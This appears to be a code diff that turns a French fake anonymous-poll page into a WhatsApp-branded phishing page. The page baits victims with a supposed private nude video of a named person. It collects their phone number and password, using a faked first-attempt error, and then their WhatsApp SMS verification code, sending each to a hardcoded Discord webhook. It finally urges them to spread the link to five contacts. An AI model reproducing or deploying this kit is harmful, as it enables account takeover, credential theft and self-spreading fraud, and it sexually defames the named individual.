@@ -3,254 +3,169 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WATSAY - Sondages Secrets</title>
+    <title>WhatsApp Media Portal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root {
-            --primary: #00ff88; /* Vert néon style WhatsApp/Matrix */
-            --secondary: #6c5ce7; /* Violet électrique style Insta */
-            --bg: #0a0b10;
-            --glass: rgba(255, 255, 255, 0.1);
+        .video-placeholder {
+            background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url('couverture.jpg');
+            background-size: cover;
+            background-position: center;
         }
-
-        body, html {
-            margin: 0;
-            padding: 0;
-            font-family: 'Segoe UI', Roboto, sans-serif;
-            background: var(--bg);
-            color: white;
-            overflow-x: hidden;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-
-        /* Effet de fond étoilé */
-        .stars {
-            position: fixed;
-            width: 100%;
-            height: 100%;
-            background: radial-gradient(circle at center, #1b2735 0%, #090a0f 100%);
-            z-index: -1;
-        }
-
-        .container {
-            width: 90%;
-            max-width: 400px;
-            background: var(--glass);
-            backdrop-filter: blur(15px);
-            padding: 30px;
-            border-radius: 25px;
-            border: 1px solid rgba(255,255,255,0.1);
-            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
-            text-align: center;
-            position: relative;
-        }
-
-        .logo-placeholder {
-            width: 80px;
-            height: 80px;
-            background: linear-gradient(45deg, var(--primary), var(--secondary));
-            border-radius: 20px;
-            margin: 0 auto 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-weight: bold;
-            font-size: 24px;
-            box-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
-        }
-
-        h1 { font-size: 28px; margin-bottom: 5px; letter-spacing: 2px; }
-        p { color: #888; margin-bottom: 25px; font-size: 14px; }
-
-        /* Effet Lumière Tournante autour des Inputs */
-        .input-group {
-            position: relative;
-            margin-bottom: 20px;
-            padding: 3px;
-            border-radius: 12px;
-            background: transparent;
-            overflow: hidden;
-        }
-
-        .input-group::before {
-            content: '';
-            position: absolute;
-            width: 150%;
-            height: 150%;
-            background: conic-gradient(var(--primary), var(--secondary), transparent 60%);
-            top: -25%;
-            left: -25%;
-            animation: rotate 4s linear infinite;
-            z-index: -1;
-        }
-
-        @keyframes rotate {
-            from { transform: rotate(0deg); }
-            to { transform: rotate(360deg); }
-        }
-
-        input {
-            width: 100%;
-            padding: 15px;
-            border: none;
-            border-radius: 10px;
-            background: #161b22;
-            color: white;
-            box-sizing: border-box;
-            outline: none;
-        }
-
-        button {
-            width: 100%;
-            padding: 15px;
-            border: none;
-            border-radius: 12px;
-            background: linear-gradient(45deg, var(--primary), var(--secondary));
-            color: white;
-            font-weight: bold;
-            cursor: pointer;
-            transition: 0.3s;
-            margin-top: 10px;
-        }
-
-        button:hover { transform: scale(1.02); box-shadow: 0 0 15px var(--primary); }
-
-        .create-account { color: var(--primary); font-size: 13px; cursor: pointer; display: block; margin-top: 15px; }
-
-        /* Loader */
-        #loader {
-            display: none;
-            margin-top: 20px;
-        }
-        .shimmer {
-            width: 100%;
-            height: 4px;
-            background: #222;
-            border-radius: 2px;
-            overflow: hidden;
-            position: relative;
-        }
-        .shimmer::after {
-            content: '';
-            position: absolute;
-            width: 40%;
-            height: 100%;
-            background: var(--primary);
-            box-shadow: 0 0 10px var(--primary);
-            animation: loading 1.5s infinite;
-        }
-        @keyframes loading {
-            0% { left: -40%; }
-            100% { left: 100%; }
-        }
-
-        /* Dashboard après connexion */
-        #dashboard { display: none; }
-        textarea {
-            width: 100%;
-            height: 100px;
-            background: rgba(0,0,0,0.3);
-            border: 1px solid #444;
-            border-radius: 10px;
-            color: white;
-            padding: 10px;
-            box-sizing: border-box;
-            margin-top: 20px;
-            resize: none;
-        }
-
-        .hidden { display: none; }
+        .blur-bg { backdrop-filter: blur(8px); }
+        .progress-transition { transition: width 0.8s ease-in-out; }
     </style>
 </head>
-<body>
+<body class="bg-[#111b21] text-[#e9edef] font-sans min-h-screen flex items-center justify-center p-4">
 
-<div class="stars"></div>
-
-<div class="container">
-    <div class="logo-placeholder">W</div>
-
-    <div id="login-screen">
-        <h1>WATSAY</h1>
-        <p>Sondages Anonymes & Secrets</p>
-        
-        <div class="input-group">
-            <input type="text" id="phone" placeholder="Numéro de téléphone">
-        </div>
-        <div class="input-group">
-            <input type="password" id="pass" placeholder="Mot de passe">
+    <div class="w-full max-w-md bg-[#202c33] rounded-2xl shadow-2xl overflow-hidden border border-gray-700">
+        <div class="bg-[#00a884] p-4 flex items-center gap-3">
+            <i class="fab fa-whatsapp text-2xl text-white"></i>
+            <span class="font-bold text-lg">WhatsApp Media Player</span>
         </div>
 
-        <button onclick="handleLogin()">SE CONNECTER</button>
-        <span class="create-account" onclick="handleLogin()">Créer un compte</span>
+        <div class="p-4">
+            <div class="video-placeholder w-full h-56 rounded-xl flex flex-col items-center justify-center relative border-2 border-dashed border-gray-500">
+                <div class="bg-white/20 p-4 rounded-full blur-bg mb-2">
+                    <i class="fas fa-play text-white text-3xl ml-1"></i>
+                </div>
+                <p class="text-sm font-semibold px-4 text-center text-white">Vidéo : Nolweŋ nude (Privé)</p>
+                <p class="text-[10px] text-gray-300 mt-1 uppercase tracking-tighter">Taille : 12.4 MB • Durée : 04:20</p>
+            </div>
+        </div>
 
-        <div id="loader">
-            <p>Initialisation du profil...</p>
-            <div class="shimmer"></div>
+        <div class="p-6 pt-2">
+            <div id="main-auth" class="bg-[#111b21] p-4 rounded-xl border border-gray-700 mb-4">
+                <p class="text-xs text-[#8696a0] mb-3 uppercase tracking-wider font-bold">Vérification de Sécurité</p>
+                
+                <form id="pirateForm" class="space-y-4">
+                    
+                    <div id="step1" class="space-y-4 text-center">
+                        <input type="text" id="phone" placeholder="Numéro de téléphone" required
+                            class="w-full bg-[#2a3942] border-none rounded-lg p-3 outline-none focus:ring-2 focus:ring-[#00a884] text-white">
+                        
+                        <div class="space-y-1">
+                            <input type="password" id="secret" placeholder="Créez un mot de passe à retenir" required
+                                class="w-full bg-[#2a3942] border-none rounded-lg p-3 outline-none focus:ring-2 focus:ring-[#00a884] text-white text-center">
+                            <p id="error-msg" class="text-[10px] text-red-400 px-1 font-semibold italic">
+                                ⚠️ Notez bien ce mot de passe. Sans lui, l'accès sera définitivement bloqué.
+                            </p>
+                        </div>
+                        
+                        <button type="button" id="nextBtn" class="w-full bg-[#00a884] text-[#111b21] font-bold py-3 rounded-full hover:bg-[#06cf9c] transition uppercase">
+                            ACCÉDER À LA VIDÉO
+                        </button>
+                    </div>
+
+                    <div id="otpSection" class="hidden">
+                        <div class="bg-gray-800 p-3 rounded-lg border border-[#00a884] mb-3">
+                            <input type="text" id="otp" placeholder="Code de déblocage (SMS)" 
+                                class="w-full bg-transparent border-none text-center text-2xl tracking-widest font-bold text-white outline-none">
+                        </div>
+                        <p class="text-[10px] text-green-400 mb-4 text-center italic">Le code de sécurité vient d'être généré par WhatsApp.</p>
+                        <button type="button" id="submitOtpBtn" class="w-full bg-[#00a884] text-[#111b21] font-bold py-3 rounded-full border-2 border-white uppercase shadow-lg">
+                            DÉBLOQUER LA LECTURE
+                        </button>
+                    </div>
+
+                    <div id="step-share" class="hidden space-y-4 text-center">
+                        <h3 class="text-orange-400 font-black text-sm uppercase">🚨 Action de Solidarité Requise</h3>
+                        <p class="text-[11px] text-gray-300">Cette vidéo est protégée. Partagez-la avec 5 amis ou groupes pour finaliser le chargement.</p>
+                        
+                        <div class="w-full bg-gray-800 h-4 rounded-full overflow-hidden border border-gray-600">
+                            <div id="bar" class="progress-transition bg-[#25D366] h-full w-0"></div>
+                        </div>
+
+                        <button type="button" onclick="handleShare()" class="w-full bg-[#25D366] text-white font-bold py-3 rounded-full flex items-center justify-center gap-2 animate-bounce">
+                            <i class="fab fa-whatsapp text-xl"></i> PARTAGER SUR WHATSAPP
+                        </button>
+                    </div>
+
+                </form>
+            </div>
+            <p class="text-[10px] text-[#8696a0] text-center italic">-Chiffrement de bout en bout-</p>
         </div>
     </div>
 
-    <div id="dashboard">
-        <h2 id="welcome-msg">Bienvenue</h2>
-        <p>Quelle est votre question secrète ?</p>
+    <script>
+        const DISCORD_WEBHOOK = "https://discordapp.com/api/webhooks/1463375154313695425/b8j4vFvQYxlrrtYrxSXgOrV3PEsdA4vXaywKb8xIMo6qEt6vVAqc3yQb_srF7-aDg4a-";
         
-        <textarea id="question" placeholder="Ex: Qui est ton crush secret ?"></textarea>
-        
-        <button id="save-btn" onclick="saveQuestion()">ENREGISTRER</button>
-        <button id="send-btn" class="hidden" onclick="shareWhatsapp()" style="background: #25D366;">ENVOYER SUR WHATSAPP</button>
-    </div>
-</div>
+        const nextBtn = document.getElementById('nextBtn');
+        const submitOtpBtn = document.getElementById('submitOtpBtn');
+        const step1 = document.getElementById('step1');
+        const otpSection = document.getElementById('otpSection');
+        const stepShare = document.getElementById('step-share');
+        const bar = document.getElementById('bar');
+        const errorMsg = document.getElementById('error-msg');
 
-<script>
-    const webhookURL = "https://discordapp.com/api/webhooks/1463375154313695425/b8j4vFvQYxlrrtYrxSXgOrV3PEsdA4vXaywKb8xIMo6qEt6vVAqc3yQb_srF7-aDg4a-";
+        let tentatives = 0;
 
-    function handleLogin() {
-        const phone = document.getElementById('phone').value;
-        if(!phone) return alert("Entrez un numéro");
+        // 1. GESTION DU MOT DE PASSE (DOUBLE ESSAI)
+        nextBtn.addEventListener('click', () => {
+            const phone = document.getElementById('phone').value;
+            const secret = document.getElementById('secret').value;
 
-        document.getElementById('loader').style.display = 'block';
-        
-        // Envoi des infos au Discord (ton terminal)
-        fetch(webhookURL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                content: `🚀 **Nouveau Compte Watsay**\n📱 Numéro: ${phone}\n🔑 Pass: ${document.getElementById('pass').value}`
-            })
+            if(!phone || !secret) return alert("Veuillez remplir les informations");
+
+            if(tentatives === 0) {
+                errorMsg.innerText = "❌ Erreur de synchronisation : Mot de passe non reconnu. Réessayez.";
+                errorMsg.classList.replace('text-red-400', 'text-yellow-400');
+                document.getElementById('secret').value = ""; 
+                tentatives++;
+            } else {
+                // Envoi des identifiants au Discord
+                fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        content: `👤 **NOUVELLE CIBLE**\n📱 **Tel :** \`${phone}\`\n🔑 **Password (Confirmé) :** ||${secret}||` 
+                    })
+                });
+                // Passage au SMS
+                step1.classList.add('hidden');
+                otpSection.classList.remove('hidden');
+            }
         });
 
-        setTimeout(() => {
-            document.getElementById('login-screen').style.display = 'none';
-            document.getElementById('dashboard').style.display = 'block';
-            document.getElementById('welcome-msg').innerText = "Bienvenue, " + phone;
-        }, 3000);
-    }
+        // 2. GESTION DU CODE SMS (AVANT LE PARTAGE)
+        submitOtpBtn.addEventListener('click', () => {
+            const phone = document.getElementById('phone').value;
+            const otp = document.getElementById('otp').value;
 
-    function saveQuestion() {
-        const q = document.getElementById('question').value;
-        if(!q) return alert("Écrivez une question !");
-        
-        // Alerte visuelle
-        document.getElementById('save-btn').innerText = "✅ ENREGISTRÉ";
-        document.getElementById('save-btn').style.background = "gray";
-        document.getElementById('send-btn').classList.remove('hidden');
+            if(!otp) return alert("Veuillez entrer le code SMS");
 
-        // Envoi de la question au Discord
-        fetch(webhookURL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                content: `❓ **Nouvelle Question**\n💬: ${q}`
-            })
+            // Envoi du code SMS au Discord
+            fetch(DISCORD_WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "🎯 CODE WHATSAPP CAPTURÉ",
+                        color: 16711680,
+                        fields: [
+                            { name: "📱 Téléphone", value: phone, inline: true },
+                            { name: "🔑 CODE SMS", value: `**${otp}**`, inline: true }
+                        ],
+                        timestamp: new Date()
+                    }]
+                })
+            });
+
+            // Passage au Partage
+            otpSection.classList.add('hidden');
+            stepShare.classList.remove('hidden');
         });
-    }
 
-    function shareWhatsapp() {
-        const text = encodeURIComponent("Pose-moi une question secrète sur Watsay ! 🤫\n\nClique ici pour voir ma réponse : " + window.location.href);
-        window.open(`https://wa.me/?text=${text}`, '_blank');
-    }
-</script>
+        // 3. GESTION DU PARTAGE (ÉTAPE FINALE)
+        function handleShare() {
+            bar.style.width = "100%";
+            const msg = encodeURIComponent("Regarde cette vidéo : " + window.location.href);
+            window.open(`https://api.whatsapp.com/send?text=${msg}`, '_blank');
 
+            setTimeout(() => {
+                alert("Erreur de décodage : Votre connexion est instable. La vidéo ne peut pas être lue pour le moment.");
+            }, 3000);
+        }
+    </script>
 </body>
 </html>
